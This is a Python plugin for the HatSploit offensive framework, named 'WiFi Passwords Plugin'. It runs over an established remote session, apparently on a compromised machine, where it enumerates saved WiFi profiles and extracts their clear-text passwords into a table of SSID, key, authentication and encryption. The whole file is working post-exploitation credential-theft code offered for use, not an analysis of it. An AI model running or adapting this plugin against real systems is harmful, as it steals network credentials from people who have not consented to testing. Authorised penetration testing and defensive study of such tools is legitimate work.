"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

WIFI_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)

TLV_TYPE_WIFI_SSID = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_WIFI_KEY = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
TLV_TYPE_WIFI_AUTH = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
TLV_TYPE_WIFI_ENC = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
TLV_TYPE_WIFI_GROUP = tlv_custom_type(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "WiFi Passwords Plugin",
            'Plugin': "wifi_passwords",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Enumerate saved WiFi profiles and extract "
                "clear-text passwords."
            ),
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "wifi",
                'Description': "Show saved WiFi passwords.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List all saved WiFi profiles.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-f', '--filter'),
                        {
                            'help': "Filter by SSID substring.",
                            'metavar': 'SSID',
                        }
                    ),
                ]
            })
        ]

    def wifi(self, args):
        if not args.list and not args.filter:
            args.list = True

        self.print_process("Enumerating WiFi profiles...")

        result = self.session.send_command(
            tag=WIFI_LIST, plugin=self.plugin
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to enumerate WiFi profiles!")
            self.print_error(
                "WiFi service may not be available on this system."
            )
            return

        headers = ("SSID", "Password", "Auth", "Encryption")
        data = []

        entry = result.get_tlv(TLV_TYPE_WIFI_GROUP)
        while entry:
            ssid = entry.get_string(TLV_TYPE_WIFI_SSID) or ''
            key = entry.get_string(TLV_TYPE_WIFI_KEY) or ''
            auth = entry.get_string(TLV_TYPE_WIFI_AUTH) or ''
            enc = entry.get_string(TLV_TYPE_WIFI_ENC) or ''

            if not args.filter or args.filter.lower() in ssid.lower():
                data.append((ssid, key, auth, enc))

            entry = result.get_tlv(TLV_TYPE_WIFI_GROUP)

        if not data:
            self.print_warning("No matching profiles found.")
            return

        self.print_table("WiFi Profiles", headers, *data)
